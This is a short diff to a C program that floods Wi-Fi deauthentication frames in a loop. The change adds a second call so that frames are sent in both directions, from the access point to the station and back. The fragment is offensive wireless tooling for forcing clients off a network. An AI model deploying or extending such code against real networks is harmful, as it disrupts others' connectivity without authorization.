@@ -160,8 +160,10 @@ int main(int argc, char *argv[])
     else {
         while(1) {
             if(station_mac_addr != NULL) {
-                // AP unicast, Station unicast frame
+                // AP unicast
                 send_deauth(handle, ap_mac_addr, station_mac_addr);
+                // Station unicast frame
+                send_deauth(handle, station_mac_addr, ap_mac_addr);
             }
             else {
                 // AP boradcast frame
